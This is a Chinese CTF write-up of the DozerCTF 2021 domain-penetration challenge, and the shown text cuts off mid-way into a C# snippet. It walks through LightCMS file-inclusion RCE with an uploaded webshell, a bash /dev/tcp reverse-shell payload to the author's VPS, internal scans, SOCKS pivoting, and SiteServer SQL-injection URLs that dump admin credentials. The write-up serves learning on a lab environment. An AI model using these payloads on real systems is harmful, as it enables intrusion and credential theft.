> **本文所涉及的内容仅供以安全为目的的学习研究使用，不得将其用于非法用途，否则后果自行承担！**
## 0x00 引言
五月底有个 DozerCTF，比赛时间和 XCTF Final、DASCTF 等几个比赛冲突了，于是当时这个比赛就基本没看了。
不过里面有个域渗透的题目还是挺有意思的，正好咱还没玩过域渗透，趁这个机会就来学一下相关的知识，来练练手。
> **题目描述：**
>
> 目标人物flag，模拟一次红队行动吧。
>
> 
>
> _（这篇文章发出来的时候环境已经关了）_
由于最近比较忙，这题在比赛的时候没怎么打，大部分是之后复现的，题目环境重置了好几次，然而复现的时候域环境还是被师傅们打烂了。
于是这篇文章就算是个渗透过程的记录吧，断断续续写的，过程中由于环境重置或者 shell
不稳定的原因导致重新打了好几次，前后会有些不连续，操作也不熟悉，写的也比较乱，师傅们随意看看就好了。Orz
## 0x01 10.10.1.47 LightCMS
入口是 [LightCMS](https://github.com/eddy8/LightCMS)
后台登录信息群里已经给了
即 dozer / dozer123
> 参考：
>
> gml 郭院士的 [lightcms后台RCE漏洞挖掘](https://igml.top/2021/05/10/lightcms-RCE/)
>
> Ying 师傅的 [LightCMS全版本后台RCE 0day分析](https://www.gem-> love.com/websecurity/2763.html)
>
> [LightCMS 文件上传&&phar反序列化rce漏洞复现](https://xz.aliyun.com/t/9561)
>
> [再谈Laravel Debug mode
> RCE（CVE-2021-3129）漏洞](https://www.freebuf.com/vuls/264662.html)
>
> GitHub: [PHPGGC: PHP Generic Gadget
> Chains](https://github.com/ambionics/phpggc)
然而当时用这个反序列化的洞打不通……最后换了个打法。
在 `/admin/neditor/serve/catchimage` 接口存在任意文件读取，可以读取
`/var/www/html/app/Http/Controllers/Admin/NEditorController.php` 文件。
发现 `/admin/neditor/serve/testInclude` 这个路由下可以进行文件包含，从而执行命令。
首先在内容管理-文章这里上传一句话木马。
然后在这个路由下执行，比如：
    1=system('bash -i >& /dev/tcp/ip/port 0>&1');&file=./upload/image/202105/iAWvVAZTHl35fVW29B5zk6iLh6G7K5tDQXL0PaX9.gif
在 vps 上就能拿到 shell，进而在根目录下拿到第一个 flag 了。
> 这里其实有个非预期，系统管理下有个日志的记录，可以直接蹭之前师傅的小车车，知道了 flag 在 `/flag_d0z3r` 。
>
> 在 `catchimage` 接口直接访问响应里的 url，内容就是 flag。
>
>
> 
### 搜集内网信息
`ifconfig`
顺便发现他用的 lightcms 版本是 1.3.5
顺便看下配置文件。
`/var/www/html/config/database.php`
`env` 看下环境变量。
于是知道了数据库是 MySQL，用户名/密码均为 `user1`.
_（登上去看了看，貌似没啥用_
扔个 kscan 上去，扫一波内网。
    [√]ssh://10.10.1.47:22  42      SSH-2.0-Op      Product:OpenSSH,Version:7.2p2 Ubuntu 4ubuntu2.10,OS:Linux,DeviceType:Ubuntu Linux; protocol 2.0,OtherInfo:Ubuntu Linux; protocol 2.0
    [√]microsoft-ds://10.10.1.1:445 103     cSMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows,HostName:DC01,DeviceType:workgroup: DOZER,OtherInfo:workgroup: DOZER
    [√]microsoft-ds://10.10.1.234:445       133     SMBr  Product:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012
    [√]microsoft-ds://10.10.1.231:445       117     qSMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012
    [√]microsoft-ds://10.10.1.250:445       105     eSMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012
    [√]https://10.10.1.231:3389     512     QM`N
    [√]http://10.10.1.47:80 200     Laravel Product:nginx,Version:1.10.3,OS:Linux,DeviceType:Ubuntu,OtherInfo:Ubuntu,server:nginx/1.10.3 (Ubuntu),
    使用可以删除相关路由（routes/web.php、rout
    [√]http://10.10.1.100:80        403     HTTP/1.1 4      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0
    [√]http://10.10.1.122:80        200     Apache2UbuntuDefaultPage:Itworks        Product:Apache httpd,Version:2.4.18,DeviceType:(Ubuntu),OtherInfo:(Ubuntu),server:Apache/2.4.18 (Ubuntu),rticularconfigurationsnippetsw
    [√]http://10.10.1.231:80        404     HTTP/1.1 4      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0
    [√]http://10.10.1.234:80        200     HTTP/1.1 2      Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0
    [√]http://10.10.1.100:81        403     403-禁止访问:访问被拒绝。       Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,:访问被拒绝。服务器错误403-禁止访问:访问被拒绝。您无权
    [√]http://10.10.1.250:80        200     DozerCTF2021–又一个WordPress站点        Product:Apache httpd,Version:2.4.39,DeviceType:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,OtherInfo:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,RSSWordPress.orgDozerCTF2021,自
    [√]mysql://10.10.1.250:3306     71      CjHost         Product:MySQL,DeviceType:unauthorized,OtherInfo:unauthorized
    [√]http://10.10.1.122:8888      200     Directorylistingfor/    Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,ldNZOmxkq3769/ctLoSsHXtMKzmiPz
    [√]http://10.10.1.122:9999      200     Directorylistingfor/    Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,private-84758d0d58d44984879202
    [√]https://10.10.1.100:443      200     Outlook Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,94jMMZwmJD5JAhCfWPm0e2+MGKDYRQ,CN=exch
大概包括：
  * 10.10.1.1 域控
  *  本机
  *  Outlook Exchange
  *  一个 web 服务器 Apache httpd
  *  另一个 web 服务器 IIS
  *  web 服务器 IIS
  *  wordpress
这里之后复现的时候整个域环境都重置了，丢了个 fscan 上去重新扫了一波。
（还是 fscan 看起来更舒服一点
    # ./fscan -h 10.10.1.1/24
    10.10.1.1:139 open
    10.10.1.231:139 open
    10.10.1.234:139 open
    10.10.1.250:139 open
    10.10.1.121:139 open
    10.10.1.250:135 open
    10.10.1.234:135 open
    10.10.1.121:135 open
    10.10.1.1:135 open
    10.10.1.47:22 open
    10.10.1.231:135 open
    10.10.1.100:81 open
    10.10.1.250:80 open
    10.10.1.234:80 open
    10.10.1.231:80 open
    10.10.1.122:80 open
    10.10.1.100:443 open
    10.10.1.100:808 open
    10.10.1.250:3306 open
    10.10.1.231:1433 open
    10.10.1.231:445 open
    10.10.1.234:445 open
    10.10.1.250:445 open
    10.10.1.121:445 open
    10.10.1.1:445 open
    10.10.1.122:1080 open
    10.10.1.100:80 open
    10.10.1.47:80 open
    10.10.1.122:8000 open
    10.10.1.122:9000 open
    10.10.1.122:8080 open
    10.10.1.100:8172 open
    10.10.1.122:9096 open
    10.10.1.122:9090 open
    10.10.1.122:10010 open
    10.10.1.1:88 open
    [*] 10.10.1.121          DOZER\DESKTOP-ALICE     Windows Server 2012 Datacenter 9200
    NetInfo:
    [*]10.10.1.121
       [->]Deskto-Alice
       [->]10.10.1.121
    NetInfo:
    [*]10.10.1.1
       [->]dc01
       [->]10.10.1.1
    NetInfo:
    [*]10.10.1.234
       [->]WIN-UIARPOTP0AL
       [->]10.10.1.234
    [*] 10.10.1.1      [+]DC DOZER\DC01              Windows Server 2012 Standard 9200
    [*] 10.10.1.234          WORKGROUP\WIN-UIARPOTP0AL   Windows Server 2012 Datacenter 9200
    [*] 10.10.1.1  (Windows Server 2012 Standard 9200)
    [*] 10.10.1.231          DOZER\SQLSERVER14       Windows Server 2012 Standard 9200
    NetInfo:
    [*]10.10.1.231
       [->]Sqlserver14
       [->]10.10.1.231
    [*] WebTitle:http://10.10.1.100        code:403 len:0      title:None
    [*] WebTitle:http://10.10.1.47         code:200 len:7      title:Laravel
    [*] WebTitle:http://10.10.1.100:81     code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
    [*] WebTitle:https://10.10.1.100       code:302 len:0      title:None
    [*] WebTitle:http://10.10.1.122        code:200 len:37     title:Apache2 Ubuntu Default Page: It works
    [*] WebTitle:http://10.10.1.231        code:404 len:0      title:None
    NetInfo:
    [*]10.10.1.250
       [->]web02
       [->]10.10.1.250
    [*] 10.10.1.250          DOZER\WEB02             Windows Server 2012 Standard 9200
    [*] WebTitle:http://10.10.1.122:8080   code:200 len:10795  title:DozerCTF 2021 &#8211; 又一个WordPress站点
    [*] WebTitle:http://10.10.1.122:9000   code:200 len:11321  title:Apache2 Ubuntu Default Page: It works
    [*] WebTitle:https://10.10.1.100/owa/  code:200 len:28240  title:Outlook
    [*] WebTitle:http://10.10.1.234        code:200 len:171    title:None
    [*] WebTitle:http://10.10.1.250        code:200 len:46     title:DozerCTF 2021 &#8211; 又一个WordPress站点
噢还漏了个 10.10.1.121 DOZER\DESKTOP-ALICE，上面说不定还有域管的 hash。
在 10.10.1.47 上用 frp / iox 之类的开个 socks 代理到自己的 vps，然后再转发到本地，这样就能直接从本地连到内网里了。
Linux 下直接在 proxychains 里配好 socks 连接，而后执行命令的时候直接 `proxychains 要执行的命令` 就完事了。
> 可以参考
>
> [内网渗透之端口转发与代理工具总结](https://www.freebuf.com/articles/web/170970.html)
## 0x02 10.10.1.234 SiteServer
> Hint:
>
> 有一次，运维人员在吃饭的时候提到了他们用了siteserver
直接访问  得到
利用报错，发现了他目录是 `/siteserver/`
进而发现是个 siteserver
登录页面：
参考 [溯源复现SiteServer5疑似在野0day](http://www.52bug.cn/hkjs/6704.html)
可以分别拿到 UserName、Password、PasswordSalt。
    http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator--    Admin
    http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator--    leonsec
    http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&publishmentSystemId=1&nodeId=1&title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator--    D79FHgmyyy5RH7WnljqNBQ==
_（不过貌似没啥用_
然后查一查 SiteServer 有啥漏洞，果然就有现成的。
>
> [简记野生应急捕获到的siteserver远程模板下载Getshell漏洞](https://www.freebuf.com/articles/web/195105.html)
>
> [SiteServer CMS 5.x 漏洞复现&分析](https://www.cnblogs.com/0x28/p/14380457.html)
>
> 
发现直接打过去无法访问，噢 GitHub 啊，没事了。
那试试 fastgit 的代理。
首先按照 README 的说明，把 downloadurl 给换掉。
懒得配 C# 环境了，直接找了个在线的执行就完事了。
    using System; 
    using System.IO; 
    using System.Security.Cryptography; 
    using System.Text; 
    namespace EncryptApplication 